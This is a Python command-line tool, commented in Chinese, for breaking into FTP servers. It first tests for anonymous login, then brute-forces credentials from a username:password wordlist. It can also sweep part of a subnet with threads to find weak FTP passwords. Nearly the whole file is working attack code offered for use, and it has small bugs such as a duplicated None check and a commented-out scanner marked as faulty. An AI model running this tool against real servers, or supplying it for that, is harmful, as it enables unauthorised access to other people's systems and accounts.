import ftplib
import argparse
import sys
import threading
import time

def connect_ftp(host,username,password):
	try:
		ftp = ftplib.FTP(host)
		ftp.login(username,password)
		print(host,"Connect Success {} {}".format(username,password))
		ftp.quit()
		return True
	except Exception as e:
		#print(host,"Connect Faild")
		return False


#尝试是否允许匿名登录
def anon_login(host):
    anon_user = 'ftp'
    anon_pass = 'ftp'
    anon_results = connect_ftp(host,anon_user,anon_pass)
    if anon_results:
        print(" [+] Anonymous Connect",anon_user,anon_pass)
        return True
    else:
        print(" [-] There is no Anonymous User")
        return False


#通过字典尝试爆力破解
def CrackFtpLogin(host,password):
    with open(password) as PassFile:
        for line in PassFile.readlines():
            username = line.split(':')[0]
            password = line.split(':')[1].strip('\r').strip('\n')
            try:
                connect_ftp(host,username,password)
            except Exception as e:
                pass


"""
#代码写的有问题
def C_scan_network(tarHost, tarPort):
	try:
		s = socket(AF_INET, SOCK_STREAM)
		s.connect((tarHost, tarPort))
		banner = s.recv(1024)
		result_ip = tarHost
		with open(password) as PassFile:
			for line in PassFile.readlines():
				username = line.split(':')[0]
				password = line.split(':')[1].strip('\r').strip('\n')
		CrackFtpLogin(result_ip,password)
		print(" [+] {}:{} open".format(tarHost, tarPort))
	except:
		print(" [-] {}:{} cloed".format(tarHost, tarPort))
"""



#扫描整修网段ftp弱口令
def ip_C(tarHost,password):
	for x in range(101, 109):
		iplist = '{}.{}'.format(tarHost, x)
		t = threading.Thread(target=CrackFtpLogin, args=(iplist,password))
		t.start()



def main():
	p = argparse.ArgumentParser(usage='''
python ftp.py --host 127.0.0.1
python ftp.py --host 127.0.0.1 --file password.txt
python ftp.py --host 192.168.4 --file password.txt -C Scan''',description='Crack FTP Password')
	p.add_argument('-host','--host',help='Input TarGet IP or Scan C network :192.168.4')
	p.add_argument('-f','--file',help='Input Password File')
	p.add_argument('-C',help='Scan C network')
	args = p.parse_args()
	host = args.host
	password = args.file
	C_Network = args.C

	if password == None or password == None:
		anon_login(host)
	elif C_Network == "Scan":
		ip_C(host,password)
	else:
		CrackFtpLogin(host,password)


if __name__ == '__main__':
    main()